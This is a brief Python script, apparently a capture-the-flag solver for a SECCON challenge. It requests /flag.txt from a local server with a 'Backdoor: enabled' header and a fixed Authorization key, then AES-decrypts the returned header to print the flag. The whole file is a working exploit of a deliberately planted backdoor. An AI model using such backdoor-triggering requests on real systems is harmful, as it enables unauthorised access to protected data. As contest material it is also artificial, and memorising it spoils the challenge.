from Crypto.Cipher import AES
import requests
import os

HOST = os.getenv("SECCON_HOST", "localhost")
PORT = int(os.getenv("SECCON_PORT", "8080"))

key = "A"*0x10
r = requests.get(f"http://{HOST}:{PORT}/flag.txt",
                 headers={
                     'Backdoor': 'enabled',
                     'Authorization': key
                 })

c = bytes.fromhex(r.headers['Backdoor'])
aes = AES.new(key.encode(), AES.MODE_ECB)
print(aes.decrypt(c))
